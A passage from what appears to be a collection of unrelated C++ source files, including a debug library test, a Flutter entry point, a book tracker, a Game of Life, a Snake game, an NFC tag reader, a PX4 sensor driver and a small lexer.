L'*';\n    debug(), x;\n    std::wstring y = L\"hello\";\n    debug(), y;\n    std::vector<char> z = {'h', 'e', 'l', 'l', 'o'};\n    debug(), z;\n#if __cplusplus >= 202002L\n# ifdef __cpp_lib_span\n    std::span<char> z1 = z;\n    debug(), z1;\n# endif\n#endif\n    std::chrono::nanoseconds z2(42);\n    debug(), z2;\n    auto z3 = std::chrono::system_clock::now();\n    debug(), z3;\n\n    struct Baby {\n        std::string name;\n        int age;\n\n        auto repr() const -> decltype(std::make_tuple(name, age)) {\n            return std::make_tuple(name, age);\n        }\n    } z4{\"peng\", 42};\n\n    debug(), z4;\n    auto z5 = static_cast<std::string>(debug(), \"hello\", 42);\n    std::cerr << z5 << '\\n';\n    float z6 = 3.14f;\n    debug(), z6;\n    debug().check(z6) > 3;\n\n    Student z7{\"peng\", 42};\n    debug(), z7;\n\n    Student2 z8{\"peng\", 42};\n    debug(), z8;\n\n    Student3<std::string, int> z9{\"peng\", 42};\n    debug(), z9;\n\n    debug::debug_formatter{std::cout} << z9 << \" got answer \" << 42 << \"\\n\";\n\n    Student4 z10;\n    debug(), z10;\n\n    std::errc z11 = std::errc::host_unreachable;\n    debug(), z11;\n\n    std::errc z12 = std::errc();\n    debug(), z12;\n\n    std::error_code z13((int)std::io_errc::stream, std::iostream_category());\n    debug(), z13;\n\n    std::error_condition z14((int)std::io_errc::stream, std::iostream_category());\n    debug(), z14;\n\n    return 0;\n#endif\n}\n\n/*\ng++ -std=c++11 test.cpp -I .\ng++ -std=c++14 test.cpp -I .\ng++ -std=c++17 test.cpp -I .\ng++ -std=c++20 test.cpp -I .\ncat debug.hpp test.cpp | sed '/\\#pragma once\\|\\#include \"debug\\.hpp\"/d' | xsel -ib\nscp debug.hpp root@142857.red:/root/142857.red\n*/\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"facebook_post\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <iomanip>\n#include \"book.h\"\nusing namespace std;\nusing namespace mybook;\n\nvoid menu();\nvoid add_book(vector<Book>& bookRecord);\nvoid display_book(const vector<Book>& bookRecord);\nstring search_book(const vector<Book>& bookRecord, const string& bookToSearch);\nvoid update_book(vector<Book>& bookRecord, const string& bookToUpdate);\nvoid delete_book(vector<Book>& bookRecord, const string& bookToDelete);\n\nint main()\n{\n    int choice;\n    vector<Book> bookRecord;\n    bool endProgram = false;\n    \n    while (!endProgram)\n    {\n        menu();\n        cout << \"--------------------\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n        cin.ignore(); // Clear the input buffer\n        \n        switch (choice) {\n            case 1:\n                add_book(bookRecord);\n                break;\n            case 2:\n                display_book(bookRecord);\n                break;\n            case 3:\n            {\n                string searchBook;\n                cout << \"Enter book name: \";\n                getline(cin, searchBook);\n                cout << search_book(bookRecord, searchBook);\n                break;\n            }\n            case 4:\n            {\n                string updateBook;\n                cout << \"Enter book name: \";\n                getline(cin, updateBook);\n                update_book(bookRecord, updateBook);\n                break;\n            }\n            case 5:\n            {\n                string deleteBook;\n                cout << \"Enter book name: \";\n                getline(cin, deleteBook);\n                delete_book(bookRecord, deleteBook);\n                break;\n            }\n            case 6:\n                cout << \"Exiting Program....\\n\";\n                endProgram = true;\n                break;\n            default:\n                cout << \"Invalid input.\\n\";\n                break;\n        }\n    }\n    \n    return 0;\n}\n\nvoid menu()\n{\n    cout << \"\\t\\t\\t\\tControl Panel\\n\";\n    cout << \"\\n\";\n    \n    cout << \"1. Add Book\\n\";\n    cout << \"2. Display Books\\n\";\n    cout << \"3. Search Book\\n\";\n    cout << \"4. Update Book\\n\";\n    cout << \"5. Delete Book\\n\";\n    cout << \"6. Exit\\n\";\n}\n\nvoid add_book(vector<Book>& bookRecord)\n{\n    string name, author, status, dateStart, dateFinish;\n    cout << \"Book Name : \";\n    getline(cin, name);\n    \n    cout << \"\\n\";\n    cout << \"Author Name : \";\n    getline(cin, author);\n    \n    cout << \"\\n\";\n    cout << \"Book Status (Plan to Read / Reading / Finished) : \";\n    getline(cin, status);\n    \n    cout << \"\\n\";\n    cout << \"Start Date (DD-MM-YYYY), if not yet start, please type None : \";\n    getline(cin, dateStart);\n    \n    cout << \"\\n\";\n    cout << \"Finish Date (DD-MM-YYYY), if not yet start, please type None : \";\n    getline(cin, dateFinish);\n    \n    Book newBook(name, author, status, dateStart, dateFinish);\n    bookRecord.push_back(newBook);\n}\n\nvoid display_book(const vector<Book>& bookRecord)\n{\n    cout << endl;\n    \n    cout << left << setw(15) << \"Book Name\"\n             << setw(15) << \"Author\"\n             << setw(15) << \"Status\"\n             << setw(15) << \"Start Date\"\n             << setw(15) << \"Finish Date\" << endl;\n\n    for (const auto& book : bookRecord)\n    {\n        cout << left << setw(15) << book.getName()\n             << setw(15) << book.getAuthor()\n             << setw(15) << book.getStatus()\n             << setw(15) << book.getDateStart()\n             << setw(15) << book.getDateFinish() << endl;\n    }\n    cout << endl;\n}\n\nstring search_book(const vector<Book>& bookRecord, const string& bookToSearch)\n{\n    for (const auto& book : bookRecord)\n    {\n        if (book.getName() == bookToSearch)\n        {\n            return book.getName() + \" is found in the book record.\\n\";\n        }\n    }\n    return bookToSearch + \" is NOT FOUND in the book record.\\n\";\n}\n\nvoid update_book(vector<Book>& bookRecord, const string& bookToUpdate)\n{\n    for (auto& book : bookRecord)\n    {\n        if (book.getName() == bookToUpdate)\n        {\n            int choice;\n            cout << \"Which info do you want to update?\\n\";\n            cout << \"1. Book Name\\n\"\n                 << \"2. Book Author\\n\"\n                 << \"3. Book Status\\n\"\n                 << \"4. Book Date Start\\n\"\n                 << \"5. Book Date Finish\\n\"\n                 << \"6. Never mind\\n\";\n            cout << \"----------------------------------\\n\";\n            cout << \"Enter your choice: \";\n            cin >> choice;\n            cin.ignore();\n            \n            switch (choice) {\n                case 1:\n                {\n                    string bookName;\n                    cout << \"Enter new book name: \";\n                    getline(cin, bookName);\n                    book.setName(bookName);\n                    cout << \"New name has been set for \" << bookToUpdate << endl;\n                    break;\n                }\n                case 2:\n                {\n                    string author;\n          ",
    "#include \"GridArray.hpp\"\n\n#include <time.h>\n#include <stdlib.h>\n\nvoid GridArray::RandomGrid(int row, int col)\n{\n\tthis->row = row;\n\tthis->col = col;\n\tsrand(time(0));\n\tgrid = std::vector<std::vector<char>>(row);\n\tfor (int i = 0; i < row; i++) {\n\t\tgrid[i] = std::vector<char>(col);\n\t\tfor (int j = 0; j < col; j++) {\n\t\t\tgrid[i][j] = rand() % 2;\n\t\t}\n\t}\n}\n\nvoid GridArray::NextGen()\n{\n\tstd::vector tmp = std::vector<std::vector<char>>(row);\n\n\tfor (int i = 0; i < row; i++) {\n\t\ttmp[i] = std::vector<char>(col);\n\t\tfor (int j = 0; j < col; j++) {\n\t\t\tchar datum = grid[i][j];\n\t\t\tint neighbor = GetNeighbor(i, j);\n\n\t\t\tif (datum == 1 && (neighbor == 2 || neighbor == 3)) {\n\t\t\t\ttmp[i][j] = 1;\n\t\t\t} else if (datum == 0 && neighbor == 3) {\n\t\t\t\ttmp[i][j] = 1;\n\t\t\t} else {\n\t\t\t\ttmp[i][j] = 0;\n\t\t\t}\n\t\t}\n\t}\n\n\tgrid = tmp;\n}\n\nint GridArray::GetNeighbor(int i, int j)\n{\n\tint neigbors = 0;\n\tfor (int k = -1; k < 2; k++) {\n\t\tfor (int h = -1; h < 2; h++) {\n\t\t\tif (k == 0 && h == 0) continue;\n\n\t\t\tint x = (k + i + row) % row;\n\t\t\tint y = (h + j + col) % col;\n\n\t\t\tneigbors += (int)grid[x][y];\n\t\t}\n\t}\n\treturn neigbors;\n}\n\nstd::vector<Cell> GridArray::GetAlivesCells()\n{\n\tstd::vector tmp = std::vector<Cell>();\n\tfor (int i = 0; i < row; i++) {\n\t\tfor (int j = 0; j < col; j++) {\n\t\t\tif (grid[i][j] == 1) {\n\t\t\t\tCell c(i, j);\n\t\t\t\ttmp.push_back(c);\n\t\t\t}\n\t\t}\n\t}\n\n\treturn tmp;\n}\n\nvoid GridArray::Clear()\n{\n\tfor (int i = 0; i < row; i++) {\n\t\tfor (int j = 0; j < col; j++) {\n\t\t\tgrid[i][j] = 0;\n\t\t}\n\t}\n}\n\nvoid GridArray::SetAt(int row, int col, char state)\n{\n\tgrid[row][col] = state;\n}",
    "// Thesis language\n//\n// Copyright (c) 2024, Yume Crossing\n// All rights reserved.\n#include \"CLI.h\"\n\n#include <string> // for std::string, std::getline\n#include <iostream> // for std::cin\n#include <fmt/base.h> // for fmt::print\n\nusing fmt::print;\nusing fmt::println;\n\nnamespace thesis\n{\n\nstd::istream& REPL::input()\n{\n    using std::getline, std::cin;\n\n    print(\"{} \", prompt);\n    return getline(cin, line);\n}\n\nvoid REPL::run()\n{\n    println(\"{}\", app_title);\n    println(\"Type \\\"exit\\\" to exit.\");\n    // The interactive mode\n    while (input() && line != \"exit\");\n    exit(0);\n}\n\nvoid CLI::parse(int argc, const char** argv) noexcept\n{\n    // The executable file path\n    executable_path = argv[0];\n    argc--;\n\n    // Convert `const char**` to `std::vector<string_view>`.\n    for (int i = 0;argc > 0;argc--,i++)\n        args.push_back({argv[i+1]});\n}\n\nvoid CLI::execute()\n{\n    // If there is no arguments, launch interactive mode.\n    if (args.size() == 0)\n        return loop.run();\n\n    for (auto arg: args)\n    {\n        if (arg == \"--help\" || arg == \"-h\")\n            exit(printHelp());  // Reserved for further `--help` extension.\n        else if (arg == \"--version\" || arg == \"-v\")\n            exit((printVersion(), 0));\n        else\n            printUnknownArg(arg);\n    }\n}\n\nint CLI::printHelp() noexcept\n{\n    println(\"usage: {} [options] [script]\\n\"\n    \"The program is an interpreter of Thesis.\",\n    TARGET_NAME);\n    return 0;\n}\n\nvoid CLI::printVersion() noexcept\n{\n    println(\"{}\", app_title);\n}\n\nvoid CLI::printUnknownArg(string_view arg) noexcept\n{\n    println(\"error: Unknown argument \\\"{}\\\" appeared.\\n\", arg);\n    printHelp();\n    exit(-1);\n}\n\n} // namespace thesis\n",
    "#include<iostream>\r\n#include<windows.h>\r\n#include<conio.h>\r\n#include <unordered_set>\r\nusing namespace std;\r\n\r\nint height = 25;\r\nint width = 90;\r\nint gameover = 0, counter;\r\nint lflag = 0, rflag = 0, uflag = 0, dflag = 0;\r\n\r\nclass Snake {\r\n    int x, y, fx, fy;\r\n\r\n    struct node {\r\n        int nx, ny;\r\n        struct node* next;\r\n        struct node* prev;\r\n    };\r\n\r\n    struct node* head = NULL;\r\n\r\npublic:\r\n\r\n    /* Manages the visibility of the cursor in the console.*/\r\n    void cursorvisibility(bool x) {\r\n        HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);\r\n        CONSOLE_CURSOR_INFO cursorInfo;\r\n        GetConsoleCursorInfo(out, &cursorInfo);\r\n        cursorInfo.bVisible = x;\r\n        SetConsoleCursorInfo(out, &cursorInfo);\r\n    }\r\n\r\n    /* Sets the console cursor position to the specified coordinates (x, y) using WinAPI's */\r\n    void gotoxy(int x, int y){\r\n        COORD pos = { x, y };\r\n        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), pos);\r\n    }\r\n\r\n   /**[Screen Management] */\r\n\r\n    /*  Displays the game screen borders */\r\n    int setBorder(int w1,int w2,int h1,int h2){\r\n        // upper and lower wall\r\n        for (int i = w1; i <= w2; i++) {\r\n            gotoxy(i, h1);\r\n            cout << \"#\";\r\n            gotoxy(i, h2);\r\n            cout << \"#\";\r\n        }\r\n        // left and right wall\r\n        for (int i = h1; i <= h2; i++) {\r\n            gotoxy(w1, i);\r\n            cout << \"#\";\r\n            gotoxy(w2, i);\r\n            cout << \"#\";\r\n        }\r\n    }\r\n\r\n    /*  Displays the current score and ESC functionality */\r\n    void sideScreen(){\r\n        gotoxy(99, 9);\r\n        cout << \"WELCOME TO \";\r\n        gotoxy(95, 10);\r\n        cout <<\"*** SNAKE GAME ***\";\r\n        gotoxy(94, 11);\r\n        cout <<\"********************\";\r\n        gotoxy(99, 13);\r\n        cout <<\" SCORE = \" << counter * 10;\r\n        gotoxy(94, 20);\r\n        cout << \" ~ Press ESC to Pause\";\r\n    }\r\n\r\n\t/* Displays the game-over screen, the player's score */\r\n    int finalScreen(){\r\n        setBorder(width/4, width/4+width/2, height/4, height/4+height/2);\r\n\r\n        gotoxy( width/2 - 9, height/2 - 2 );\r\n        cout << \"*** GAME OVER ***\";\r\n        gotoxy( width/2 - 10, height/2 - 1 );\r\n        cout << \"*******************\";\r\n\r\n        gotoxy(width/2 - 9, height/2+2 );\r\n        cout << \" You Scored : \" << counter * 10;\r\n        cursorvisibility(false);\r\n\r\n        Sleep(15000); // Pause for 1.5 seconds before clearing the screen\r\n        system(\"cls\");\r\n    }\r\n\r\n\r\n   /**[Fruit and Snake Management] */\r\n\r\n    /* Create the Fruit */\r\n    void createFruit(){\r\n        gotoxy(fx, fy);\r\n        cout << \"@\";\r\n    }\r\n\r\n    /* Create the Snake */\r\n    void createSnake(struct node* head){\r\n        struct node* ptr = head;\r\n        int count = 0;\r\n        while (ptr != NULL) {\r\n            gotoxy(ptr->nx, ptr->ny);\r\n            if (count == 0) {\r\n                cout << \"O\"; // head\r\n            } else {\r\n                cout << \"o\"; // body\r\n            }\r\n            ptr = ptr->next;\r\n            count++;\r\n        }\r\n    }\r\n\r\n    /* Create the Snake's Body */\r\n\tvoid createBody(struct node* head, int x, int y){\r\n\t\tstruct node* ptr, * previous;\r\n\t\tptr = head;\r\n\t\tprevious = head;\r\n\r\n\t\twhile (ptr->next != NULL){\r\n\t\t\tprevious = ptr;\r\n\t\t\tptr = ptr->next;\r\n\t\t}\r\n\t\twhile (previous != head){\r\n\t\t\tptr->nx = previous->nx;\r\n\t\t\tptr->ny = previous->ny;\r\n\t\t\tprevious = previous->prev;\r\n\t\t\tptr = ptr->prev;\r\n\t\t}\r\n\t\tptr->nx = previous->nx;\r\n\t\tptr->ny = previous->ny;\r\n\t\tprevious->nx = x;\r\n\t\tprevious->ny = y;\r\n\t}\r\n\r\n    /* Remove the Snake from the Screen */\r\n    void removeSnake(struct node* head){\r\n        struct node* ptr = head;\r\n        while (ptr != NULL) {\r\n            gotoxy(ptr->nx, ptr->ny);\r\n            cout << \" \";\r\n            ptr = ptr->next;\r\n        }\r\n    }\r\n\r\n    /* Snake's Initial Position */\r\n    void setInitialPosition() {\r\n        head = new node;\r\n        // Set the initial coordinates for the snake head at the center of the game grid.\r\n        head->nx = width / 2;\r\n        head->ny = height / 2;\r\n\r\n        head->next = NULL;\r\n        head->prev = NULL;\r\n\r\n        // Set the x and y variables to the same values as the head's coordinates.\r\n        x = width / 2;\r\n        y = height / 2;\r\n    }\r\n\r\n    /* Illustrate the snake and the fruit */\r\n    void draw(){\r\n        createSnake(head);\r\n        createFruit();\r\n        cursorvisibility(false);\r\n        Sleep(70);\r\n\r\n        removeSnake(head);\r\n        cursorvisibility(true);\r\n    }\r\n\r\n   /**[Snake Movement] */\r\n\r\n    /* Resets the Movement flags to their default values.*/\r\n    void resetflag(){\r\n\t\tuflag = 0;\r\n\t\tdflag = 0;\r\n\t\tlflag = 0;\r\n\t\trflag = 0;\r\n\t}\r\n\r\n    /* Handles keyboard inputs for movement and game pause*/\r\n\tvoid snakeMove(){\r\n\t\tint h;\r\n\t\tchar ch;\r\n\t\t// If a key is pressed\r\n\t\tif (_kbhit()){\r\n\t\t\tch = _getch();   // Store the pressed key\r\n\t\t\th = ch;         // store the ascii code of the pressed key\r\n            switch (h){\r\n                case 72:\r\n                 ",
    "#include \"MifareClassic.h\"\n#ifdef NDEF_SUPPORT_MIFARE_CLASSIC\n\n#define BLOCK_SIZE 16\n#define LONG_TLV_SIZE 4\n#define SHORT_TLV_SIZE 2\n\n#define MIFARE_CLASSIC (\"Mifare Classic\")\n\nMifareClassic::MifareClassic(PN532& nfcShield)\n{\n  _nfcShield = &nfcShield;\n}\n\nMifareClassic::~MifareClassic()\n{\n}\n\nNfcTag MifareClassic::read(byte *uid, unsigned int uidLength)\n{\n    uint8_t key[6] = { 0xD3, 0xF7, 0xD3, 0xF7, 0xD3, 0xF7 };\n    int currentBlock = 4;\n    int messageStartIndex = 0;\n    int messageLength = 0;\n    byte data[BLOCK_SIZE];\n\n    // read first block to get message length\n    int success = _nfcShield->mifareclassic_AuthenticateBlock(uid, uidLength, currentBlock, 0, key);\n    if (success)\n    {\n        success = _nfcShield->mifareclassic_ReadDataBlock(currentBlock, data);\n        if (success)\n        {\n            if (!decodeTlv(data, messageLength, messageStartIndex)) {\n                return NfcTag(uid, uidLength, \"ERROR\"); // TODO should the error message go in NfcTag?\n            }\n        }\n        else\n        {\n#ifdef NDEF_USE_SERIAL\n            Serial.print(F(\"Error. Failed read block \"));Serial.println(currentBlock);\n#endif\n            return NfcTag(uid, uidLength, MIFARE_CLASSIC);\n        }\n    }\n    else\n    {\n#ifdef NDEF_USE_SERIAL\n        Serial.println(F(\"Tag is not NDEF formatted.\"));\n#endif\n        // TODO set tag.isFormatted = false\n        return NfcTag(uid, uidLength, MIFARE_CLASSIC);\n    }\n\n    // this should be nested in the message length loop\n    int index = 0;\n    int bufferSize = getBufferSize(messageLength);\n    uint8_t buffer[bufferSize];\n\n    #ifdef MIFARE_CLASSIC_DEBUG\n    Serial.print(F(\"Message Length \"));Serial.println(messageLength);\n    Serial.print(F(\"Buffer Size \"));Serial.println(bufferSize);\n    #endif\n\n    while (index < bufferSize)\n    {\n\n        // authenticate on every sector\n        if (_nfcShield->mifareclassic_IsFirstBlock(currentBlock))\n        {\n            success = _nfcShield->mifareclassic_AuthenticateBlock(uid, uidLength, currentBlock, 0, key);\n            if (!success)\n            {\n#ifdef NDEF_USE_SERIAL\n                Serial.print(F(\"Error. Block Authentication failed for \"));Serial.println(currentBlock);\n#endif\n                // TODO error handling\n            }\n        }\n\n        // read the data\n        success = _nfcShield->mifareclassic_ReadDataBlock(currentBlock, &buffer[index]);\n        if (success)\n        {\n            #ifdef MIFARE_CLASSIC_DEBUG\n            Serial.print(F(\"Block \"));Serial.print(currentBlock);Serial.print(\" \");\n            _nfcShield->PrintHexChar(&buffer[index], BLOCK_SIZE);\n            #endif\n        }\n        else\n        {\n#ifdef NDEF_USE_SERIAL\n            Serial.print(F(\"Read failed \"));Serial.println(currentBlock);\n#endif\n            // TODO handle errors here\n        }\n\n        index += BLOCK_SIZE;\n        currentBlock++;\n\n        // skip the trailer block\n        if (_nfcShield->mifareclassic_IsTrailerBlock(currentBlock))\n        {\n            #ifdef MIFARE_CLASSIC_DEBUG\n            Serial.print(F(\"Skipping block \"));Serial.println(currentBlock);\n            #endif\n            currentBlock++;\n        }\n    }\n\n    return NfcTag(uid, uidLength, MIFARE_CLASSIC, &buffer[messageStartIndex], messageLength);\n}\n\nint MifareClassic::getBufferSize(int messageLength)\n{\n\n    int bufferSize = messageLength;\n\n    // TLV header is 2 or 4 bytes, TLV terminator is 1 byte.\n    if (messageLength < 0xFF)\n    {\n        bufferSize += SHORT_TLV_SIZE + 1;\n    }\n    else\n    {\n        bufferSize += LONG_TLV_SIZE + 1;\n    }\n\n    // bufferSize needs to be a multiple of BLOCK_SIZE\n    if (bufferSize % BLOCK_SIZE != 0)\n    {\n        bufferSize = ((bufferSize / BLOCK_SIZE) + 1) * BLOCK_SIZE;\n    }\n\n    return bufferSize;\n}\n\n// skip null tlvs (0x0) before the real message\n// technically unlimited null tlvs, but we assume\n// T & L of TLV in the first block we read\nint MifareClassic::getNdefStartIndex(byte *data)\n{\n\n    for (int i = 0; i < BLOCK_SIZE; i++)\n    {\n        if (data[i] == 0x0)\n        {\n            // do nothing, skip\n        }\n        else if (data[i] == 0x3)\n        {\n            return i;\n        }\n        else\n        {\n#ifdef NDEF_USE_SERIAL\n            Serial.print(\"Unknown TLV \");Serial.println(data[i], HEX);\n#endif\n            return -2;\n        }\n    }\n\n    return -1;\n}\n\n// Decode the NDEF data length from the Mifare TLV\n// Leading null TLVs (0x0) are skipped\n// Assuming T & L of TLV will be in the first block\n// messageLength and messageStartIndex written to the parameters\n// success or failure status is returned\n//\n// { 0x3, LENGTH }\n// { 0x3, 0xFF, LENGTH, LENGTH }\nbool MifareClassic::decodeTlv(byte *data, int &messageLength, int &messageStartIndex)\n{\n    int i = getNdefStartIndex(data);\n\n    if (i < 0 || data[i] != 0x3)\n    {\n#ifdef NDEF_USE_SERIAL\n        Serial.println(F(\"Error. Can't decode message length.\"));\n#endif\n        return false;\n    }\n    else\n    {\n        if (data[i+1] == 0xFF)\n        {\n            messageLength",
    "/****************************************************************************\n *\n *   Copyright (C) 2021 PX4 Development Team. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n *\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in\n *    the documentation and/or other materials provided with the\n *    distribution.\n * 3. Neither the name PX4 nor the names of its contributors may be\n *    used to endorse or promote products derived from this software\n *    without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n * \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n * FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n * COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS\n * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED\n * AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n * ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n * POSSIBILITY OF SUCH DAMAGE.\n *\n ****************************************************************************/\n#include <px4_platform_common/getopt.h>\n#include <px4_platform_common/module.h>\n\n#include \"ina238.h\"\n\nI2CSPIDriverBase *INA238::instantiate(const I2CSPIDriverConfig &config, int runtime_instance)\n{\n\tINA238 *instance = new INA238(config, config.custom1);\n\n\tif (instance == nullptr) {\n\t\tPX4_ERR(\"alloc failed\");\n\t\treturn nullptr;\n\t}\n\n\tif (config.keep_running) {\n\t\tif (instance->force_init() != PX4_OK) {\n\t\t\tPX4_INFO(\"Failed to init INA238 on bus %d, but will try again periodically.\", config.bus);\n\t\t}\n\n\t} else if (instance->init() != PX4_OK) {\n\t\tdelete instance;\n\t\treturn nullptr;\n\t}\n\n\treturn instance;\n}\n\nvoid\nINA238::print_usage()\n{\n\tPRINT_MODULE_DESCRIPTION(\n\t\tR\"DESCR_STR(\n### Description\nDriver for the INA238 power monitor.\n\nMultiple instances of this driver can run simultaneously, if each instance has a separate bus OR I2C address.\n\nFor example, one instance can run on Bus 2, address 0x45, and one can run on Bus 2, address 0x45.\n\nIf the INA238 module is not powered, then by default, initialization of the driver will fail. To change this, use\nthe -f flag. If this flag is set, then if initialization fails, the driver will keep trying to initialize again\nevery 0.5 seconds. With this flag set, you can plug in a battery after the driver starts, and it will work. Without\nthis flag set, the battery must be plugged in before starting the driver.\n\n)DESCR_STR\");\n\n\tPRINT_MODULE_USAGE_NAME(\"ina238\", \"driver\");\n\n\tPRINT_MODULE_USAGE_COMMAND(\"start\");\n\tPRINT_MODULE_USAGE_PARAMS_I2C_SPI_DRIVER(true, false);\n\tPRINT_MODULE_USAGE_PARAMS_I2C_ADDRESS(0x45);\n\tPRINT_MODULE_USAGE_PARAMS_I2C_KEEP_RUNNING_FLAG();\n\tPRINT_MODULE_USAGE_PARAM_INT('t', 1, 1, 3, \"battery index for calibration values (1 or 3)\", true);\n\tPRINT_MODULE_USAGE_DEFAULT_COMMANDS();\n}\n\nextern \"C\" int\nina238_main(int argc, char *argv[])\n{\n\tint ch;\n\tusing ThisDriver = INA238;\n\tBusCLIArguments cli{true, false};\n\tcli.i2c_address = INA238_BASEADDR;\n\tcli.default_i2c_frequency = 100000;\n\tcli.support_keep_running = true;\n\tcli.custom1 = 1;\n\n\twhile ((ch = cli.getOpt(argc, argv, \"t:\")) != EOF) {\n\t\tswitch (ch) {\n\t\tcase 't': // battery index\n\t\t\tcli.custom1 = (int)strtol(cli.optArg(), NULL, 0);\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tconst char *verb = cli.optArg();\n\tif (!verb) {\n\t\tThisDriver::print_usage();\n\t\treturn -1;\n\t}\n\n\tBusInstanceIterator iterator(MODULE_NAME, cli, DRV_POWER_DEVTYPE_INA238);\n\n\tif (!strcmp(verb, \"start\")) {\n\t\treturn ThisDriver::module_start(cli, iterator);\n\t}\n\n\tif (!strcmp(verb, \"stop\")) {\n\t\treturn ThisDriver::module_stop(iterator);\n\t}\n\n\tif (!strcmp(verb, \"status\")) {\n\t\treturn ThisDriver::module_status(iterator);\n\t}\n\n\tThisDriver::print_usage();\n\treturn -1;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <stdlib.h>\n#include <string>\n#include <variant>\n\n#define TODO(text)        \\\n    printf(\"%s\\n\", text); \\\n    exit(255);\n\n#define UNREACHABLE                       \\\n    printf(\"Unreachable code reached\\n\"); \\\n    exit(255);\n\nenum TokenType\n{\n    OPEN_PAREN,\n    CLOSE_PAREN,\n    ATOM,\n};\n\nenum AtomType\n{\n    SYMBOL,\n    STRING,\n    NUMBER,\n};\n\nstd::string TokenTypeName[3] = {\n    \"OPEN_PAREN\",\n    \"CLOSE_PAREN\",\n    \"ATOM\",\n};\n\nstd::string AtomTypeName[3] = {\n    \"SYMBOL\",\n    \"STRING\",\n    \"NUMBER\",\n};\n\nclass Location\n{\npublic:\n    int row;\n    int col;\n\n    Location(int row, int col)\n    {\n        this->row = row;\n        this->col = col;\n    }\n\n    std::string dump()\n    {\n        return std::to_string(this->row + 1) + \":\" + std::to_string(this->col + 1);\n    }\n};\n\nclass Atom\n{\npublic:\n    AtomType type;\n    std::variant<std::string, float> payload;\n\n    Atom(AtomType type, std::variant<std::string, float> payload)\n    {\n        this->type = type;\n        this->payload = payload;\n    }\n\n    template <typename T>\n    T get_payload()\n    {\n        if (auto value = std::get_if<T>(&this->payload))\n        {\n            return *value;\n        }\n        UNREACHABLE;\n    }\n};\n\nclass Token\n{\npublic:\n    TokenType type;\n    std::string value;\n    Location *loc;\n    Atom *atom;\n\n    Token(TokenType type, std::string value, Location *loc, Atom *atom)\n    {\n        this->type = type;\n        this->value = value;\n        this->loc = loc;\n\n        if (atom != NULL)\n        {\n            this->atom = atom;\n        }\n    }\n};\n\nclass Lexer\n{\npublic:\n    std::string text;\n    size_t loc = 0;\n    size_t bol = 0;\n    size_t row = 0;\n\n    Lexer(std::string text)\n    {\n        this->text = text;\n    }\n\n    void chop_char()\n    {\n        if (this->is_not_empty())\n        {\n            char curr_char = this->text.at(this->loc);\n            this->loc += 1;\n\n            if (curr_char == '\\n')\n            {\n                this->bol = this->loc;\n                this->row += 1;\n            }\n        }\n    }\n\n    void trim_left()\n    {\n        while (this->is_not_empty() && isspace(this->text.at(this->loc)))\n        {\n            this->chop_char();\n        }\n    }\n\n    Token *next_token()\n    {\n        if (!this->is_not_empty())\n        {\n            throw -1;\n        }\n\n        this->trim_left();\n\n        Location *loc = new Location(this->row, this->loc - this->bol);\n\n        char first_char = this->text.at(this->loc);\n\n        if (first_char == '(')\n        {\n            this->chop_char();\n            return new Token(TokenType::OPEN_PAREN, \"(\", loc, NULL);\n        }\n        else if (first_char == ')')\n        {\n            this->chop_char();\n            return new Token(TokenType::CLOSE_PAREN, \")\", loc, NULL);\n        }\n        else if (isdigit(first_char) || first_char == '-')\n        {\n            bool is_negative = false;\n\n            if (first_char == '-')\n            {\n                this->chop_char();\n                is_negative = true;\n            }\n\n            int start_index = this->loc;\n            int end_index = 0;\n\n            while (this->is_not_empty() && isdigit(this->text.at(this->loc)) || this->text.at(this->loc) == '.')\n            {\n                this->chop_char();\n                end_index += 1;\n            }\n            std::string num = this->text.substr(start_index, end_index);\n\n            std::string value = is_negative ? \"-\" + num : num;\n            float parsed_value = this->string_to_float(value);\n\n            Atom *atom = new Atom(AtomType::NUMBER, parsed_value);\n\n            return new 